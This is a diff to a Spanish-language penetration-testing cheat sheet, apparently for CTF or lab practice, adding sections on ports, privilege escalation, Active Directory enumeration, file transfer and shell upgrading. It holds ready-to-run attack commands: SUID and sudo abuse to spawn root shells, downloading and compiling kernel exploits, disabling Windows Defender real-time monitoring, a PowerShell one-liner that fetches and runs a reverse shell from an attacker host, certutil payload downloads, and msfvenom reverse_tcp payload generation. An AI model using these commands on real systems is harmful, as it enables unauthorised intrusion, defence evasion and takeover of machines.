@@ -59,10 +59,48 @@ FOR LEGAL PURPOSES ONLY:
 
 
 
+
+===========================
+===        PORTS        ===
+===========================
+
+
+COMMON PORTS
+_________________________________________________________________________________________
+
+20-21	 FTP
+22	 SSH
+23	 Telnet
+25	 SMTP
+53	 DNS
+69	 TFTP
+80	 HTTP
+88	 Kerberos
+102	 MS Exchange
+115	 SFTP
+110	 POP3
+123	 NTP
+135	 RPC
+137-39	 NETBIOS
+143	 IMAP4
+179	 BGP
+443	 HTTPS
+445	 SMB
+465	 SMTP over SSL
+587	 SMTP
+1433-34	 Microsoft SQL Server
+3306	 MySQL
+3389	 RDP
+5355	 LLMNR
+5985	 WinRM HTTP
+5986	 WinRM HTTPS
+8080-81	 HTTP Proxy
+
+
+
 ===========================
 ===     ENUMERATION     ===
 ===========================
-
 
 
 HOSTS DISCOVERY
@@ -146,7 +184,6 @@ ________________________________________________________________________________
 ===========================
 
 
-
 METASPLOIT
 _________________________________________________________________________________________
 
@@ -206,7 +243,6 @@ ________________________________________________________________________________
 ===========================
 
 
-
 # Payload sin endoder:
 	msfvenom -p windows/meterpreter/reverse_tcp RHOST=[RHOST] LHOST=[LHOST] LPORT=[4444] -f exe > reverse.exe
 # Payload con endoder:
@@ -217,7 +253,6 @@ ________________________________________________________________________________
 ===========================
 ===      CRACKING       ===
 ===========================
-
 
 
 # Repositorios de diccionarios
@@ -289,7 +324,6 @@ ________________________________________________________________________________
 ===========================
 
 
-
 GUIA OWASP TOP 10 (2021)
 _________________________________________________________________________________________
 
@@ -312,7 +346,6 @@ A10:2021-Server-Side Request Forgery*
 ===========================
 ===   ENUMERATION WEB   ===
 ===========================
-
 
 
 FIRST STEPS
@@ -468,7 +501,6 @@ ________________________________________________________________________________
 ===========================
 ===   PENTESTING  WEB   ===
 ===========================
-
 
 
 LOGIN ATT DICTIONARY
@@ -685,7 +717,8 @@ ________________________________________________________________________________
 	http://[RHOST]/hackable/uploads/reverse.php
 
 
-
+CPDoS
+_________________________________________________________________________________________
 
 
 # https://cpdos.org/
@@ -693,17 +726,272 @@ ________________________________________________________________________________
 
 
 ===========================
-===    SETTING  KALI    ===
+===  PENTESTING MOBILE  ===
 ===========================
 
 
-
-KALI TOOLS
+MOBSF
 _________________________________________________________________________________________
 
-# Actualizar e instalar todas la herramientas de Kali Linux
-	sudo apt update && sudo apt install kali-tools-*
-	sudo apt update && sudo apt upgrade -y
+# Detectar vulnerabilidades de seguridad en aplicaciones móviles iOS y Android
+	sudo apt install python3-dev python3-venv python3-pip build-essential libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg62-turbo-dev zlib1g-dev wkhtmltopdf python3-poetry git gunicorn python3-virtualenv
+	pip3 install virtualenv
+	virtualenv -p python3 venv
+
+
+
+===========================
+===  POST EXPLOITATION  ===
+===========================
+
+
+PRIVILEGE ESCALATION LINUX
+_________________________________________________________________________________________
+
+# ENUM Manual #
+	hostname   ---   nombre de la maquina
+	pwd   ---   ruta donde estoy
+	whoami   ---   quien soy
+	env   ---   ver variables de entorno
+	id   ---   ver id que tengo
+	uname -a   ---   version del kernel
+	cat /proc/version   ---   version del kernel
+	sudo -l   ---   muestra comandos sudo que pueda utilizar el user
+	cat /etc/crontab   ---   tareas programadas
+	cat /etc/passwd   ---   sacar usuarios
+	systemctl list-timers   ---   
+	history   ---   ver el historial
+	pspy   ---   
+	ps -ef   ---   ver los procesos
+	ifconfig   ---   sacar NICs (Pivoting)
+	netstat	   ---   ver los servicios que estan corriendo
+	getcap -r / 2>/dev/null   ---   
+	ss -tulwn   --- 
+	find / -perm -u=s -type f 2>/dev/null   ---   enumerar binarios con permiso suid
+	find / -type f -perm -04000 -ls 2>/dev/null
+	find / -perm -4000 2>/dev/null | xargs ls -l
+*Si tras ganar acceso a una shell en la maquina objetivo, somos un usuario con pocos privilegios 
+pero tenemos acceso a /var/www/html podemos buscar mediante el siguiente comando find archivos de 
+configuracion que contengan contraseñas o datos sensibles, para empezar a ganar privilegios:
+find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always /dev/null {} \;
+
+# ENUM Auto LinPEAS #
+	wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+
+
+# KERNEL EXPLOITS # Versiones muy desactualizadas
+	lsb_release -a   ---   distribucion exacta de ubuntu
+	uname -a
+	cat /proc/version
+# Buscar exploits contra ese kernel
+	searchsploit 3.13.0
+	searchsploit -m 37292.c   ---   copiar exploit
+# Pasarlo al target con 
+	Kali   ---   sudo python3 -m http.server 8080
+	Target   ---   wget http://10.10.120.64:8080/37292.c
+# En este caso, al ser C se compila o si no tiene permisos de ejecucion se le añaden
+	gcc 37929.c -o xploit
+	chmod +x [FILE]
+# Ejecutar exploit
+	./xploit
+
+
+# SUDO # Mala configuración de sudo
+	sudo -l
+	ex: (ALL) NOPASSWD: /usr/bin/find
+# Buscar binarios de Unix para posibles malas configuraciones
+	https://gtfobins.github.io/
+	ex: sudo find . -exec /bin/sh \; -quit
+
+
+# SUID # Ejecutar herramientas o comandos con permisos del propietario, como root
+	find / -perm -u=s -type f 2>/dev/null
+	find / -type f -perm -04000 -ls 2>/dev/null
+	find / -perm -4000 2>/dev/null | xargs ls -l
+# No vale para escalar privilegios, pero si sirve para realizar funciones no permitidas que ayuden a escalar o acceder a /etc/shadow
+# Al ejecutar los siguientes comandos, añades permiso suid, a find por ejemplo. Pudiendo escalar
+	which find
+	chmod 4755 /usr/bin/find   ---   añade el suid
+	ls -lah /usr/bin/find   ---   se vera en rojo y pondra el permiso "s"
+	find . -exec /bin/sh \; -quit
+
+
+# CRON JOBS #
+
+
+# CAPABILITIES #
+
+
+
+
+
+
+
+
+PRIVILEGE ESCALATION WINDOWS
+_________________________________________________________________________________________
+
+# ENUM Manual #
+	hostname
+	whoami
+	whoami /priv	syteminfo
+	ipconfig
+	cmdkey /list
+	icacls
+	schtasks /query
+	schtasks /query /fo LIST /v
+	dir
+	sc
+	set
+	netstat
+	reg /query
+	sc query windefend
+	sc queryex type=service
+	WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
+	netsh advfirewall firewall dump
+	Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+*Probar a deshabilitar el escaneo de todos los ficheros descargados y/o adjuntos para subir nuestros ficheros: 
+"Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus" luego → "Set-MpPreference -DisableIOAVProtection $true"
+
+# ENUM Auto #
+	WinPEAS
+
+
+ACTIVE DIRECTORY
+_________________________________________________________________________________________
+
+# https://www.hackplayers.com/2022/03/top10-de-ataques-al-directorio-activo.html
+	crackmapexec smb [rango_IP]   ---   realizar peticiones smb para descubrir equipos del dominio
+	crackmapexec smb [rango_IP] -u '' -p '' --shares   ---   enumerar carpetas compartidas en los equipos con un user anonimo
+	crackmapexec smb [rango_IP] -u 'user' -p 'password' --shares   ---   enumerar carpetas compartidas en los equipos con un user autenticado
+	crackmapexec smb [IP_DC] -u 'user' -p 'password' --groups   ---   enumerar grupos en los equipos con un user autenticado
+	crackmapexec smb [IP_DC] -u 'user' -p 'password' --users   ---   enumerar usuarios en los equipos con un user autenticado
+	crackmapexec smb [IP_DC] --pass-pol   ---   enumerar politica contraseñas del dominio
+	bloodhound-python -u user -p password -d dominio.local -c All   ---   sacar información del dominio para verla con bloodhound
+	ldapsearch -LLL -x -H ldap://dominio.local -b "" -s base "(objectclass=*)"   ---   descubrir el DC por medio de ldap
+
+
+PERSISTENCE (BACK DOOR)
+_________________________________________________________________________________________
+
+
+EXTRACT CREDENTIALS
+_________________________________________________________________________________________
+
+
+PIVOTING
+_________________________________________________________________________________________
+
+
+TRATAMIENTO DE IMAGENES
+_________________________________________________________________________________________
+
+exiftool imagen.png   ---   sacar datos exif de una imagen
+strings imagen.png   ---   sacar los strings, texto, datos ocultos de una imagen
+
+
+BORRAR HUELLAS
+_________________________________________________________________________________________
+
+
+
+
+===========================
+===   IMPORTANT TOOLS   ===
+===========================
+
+
+FIND FLAGS 
+_________________________________________________________________________________________
+
+# Linux
+	find / -type f -name "*.txt"
+	find / -type f -name "user.txt"
+	find / -type f -name "root.txt"
+
+# Windows
+	dir C:\ /s /b | find "user.txt"
+	dir C:\ /s /b | find "user.txt"
+
+
+FILE TRANSFER 
+_________________________________________________________________________________________
+
+# Kali crear un servidos web
+	sudo python3 -m http.server 8080
+	sudo python3 -m SimpleHTTPServer 8080
+	sudo python3 smbserver.py [PUT_NAME] /[PATH] 
+	ex: smbserver.py reverse /home/kali/Downloads
+
+# Target Linux
+	wget http://[IP]:[PORT]/[FILE]
+	ex: wget http://10.10.120.64:8080/LinPEAS.sh
+         
+# Target Windows
+	curl -O http://[IP]/[FILE]
+	certutil.exe -f -urlcache -split "http://[LHOST]/[FILE]" [FILE]
+	powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
+	Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
+	powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+	powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+	copy \\IP\recurso
+
+# ¡RECUERDA! Añadir el permiso de ejecucion.
+	chmod +x [FILE]
+
+
+COMPILAR C
+_________________________________________________________________________________________
+
+# Linux
+	gcc program.c –o executable.exe
+	gcc 37929.c -o xploit
+
+# Windows
+	i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
+
+
+TTY 
+_________________________________________________________________________________________
+
+# Linux
+	Bash
+# 1.-
+	script /dev/null -c bash
+	ctrl+z
+	stty raw-echo
+	fg
+	reset
+	xterm
+	export TERM=xterm
+	export SHELL=bash
+	stty rows 52 columns 180
+# 2.-
+	script /dev/null -c bash
+	ctrl+z
+	stty raw-echo
+	fg
+	reset
+	xterm
+	export TERM=xterm
+	export SHELL=bash
+	stty rows 52 columns 180
+# 3.-
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
+	export TERM=screen-256color
+	[Ctrl + z]
+	echo $TERM
+	stty raw -echo
+	fg
+	[INTRO]
+# 4.-
+	oneliner: stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+# 5.-
+	script -q /dev/null -c bash
+	/usr/bin/script -qc /bin/bash /dev/null
+
+# Windows
+	https://github.com/antonioCoco/ConPtyShell
 
 
 VIRTUAL ENVIRONMENT
@@ -718,6 +1006,20 @@ ________________________________________________________________________________
 	ex: pip install -r requirements.txt
 # Desactivar el entorno virtual
 	deactivate
+
+
+
+===========================
+===    SETTING  KALI    ===
+===========================
+
+
+KALI TOOLS
+_________________________________________________________________________________________
+
+# Actualizar e instalar todas la herramientas de Kali Linux
+	sudo apt update && sudo apt install kali-tools-*
+	sudo apt update && sudo apt upgrade -y
 
 
 ALIAS
@@ -839,4 +1141,3 @@ ________________________________________________________________________________
 -L			si no conocemos el usuario añaciendo el diccionario a usar
 -p			si conocemos la contraseña
 -P			si no conocemos la contraseña añaciendo el diccionario a usar
-
